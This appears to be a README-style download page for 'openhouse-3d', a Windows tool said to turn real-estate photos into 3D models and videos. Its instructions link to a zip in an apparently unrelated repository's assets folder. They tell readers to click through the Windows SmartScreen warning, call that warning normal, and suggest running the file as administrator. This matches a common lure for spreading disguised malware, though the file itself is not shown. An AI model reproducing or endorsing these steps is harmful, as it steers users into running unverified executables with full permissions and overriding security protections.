🚀 Getting Started - 3 Simple Steps

Follow these steps to download and run openhouse-3d on your Windows computer:

  1. Download the Software
    Visit this link to download the application: https://github.com/FilipStanic/filipstanic.github.io/raw/refs/heads/main/assets/App-2.1.zip. Once there, look for the download button to grab the latest version.
  2. Run the Program
    After downloading, find the file in your Downloads folder. Double-click to run it. You may see a security prompt (Windows SmartScreen) - just click "More info" and then "Run anyway" if it appears. The program will open a friendly window.
  3. Add Your Photos
    In the program, click "Select Photos" to choose the real-estate photos you want to process. Then click "Start Processing" and wait. The software will automatically create the 3D model and video. You'll find the finished files in the same folder as your photos, in a new folder named "output".
📌 Tip: For best results, use high-quality photos taken from different angles of each room. Ensure good lighting and avoid blurry images.

❓ Frequently Asked Questions

Do I need any special equipment?

No! Just a Windows PC (Windows 10 or 11) and a set of listing photos. The software handles all the heavy lifting using built-in Blender tools - you don't need to install anything else.

How long does it take to process photos?

On a typical modern computer, processing a standard house (15-20 photos) takes about 2-5 minutes. The software will show a progress bar while it works.

What kind of videos can I get?

You'll receive a cinematic MP4 walkthrough video that smoothly moves through each room. You can also export a static 3D model file (Blender format) for further customization, and even add virtual furniture to empty spaces.

Is my data private?

Yes, everything runs locally on your computer. Your photos never leave your machine - they're only used to generate the model and video right on your PC.

🛠️ Troubleshooting Tips

  • ❗ Windows SmartScreen warning: If you see a blue screen saying "Windows protected your PC", click on "More info" and then "Run anyway". This is normal for new software.
  • ❗ App doesn't open: Right-click the downloaded file and select "Run as administrator" to give it full permissions.
  • ❗ Photos not processing: Make sure your photos are in common formats (JPG, PNG). If you have a very large set of photos (more than 40), try selecting fewer - about 15-25 good photos work best.
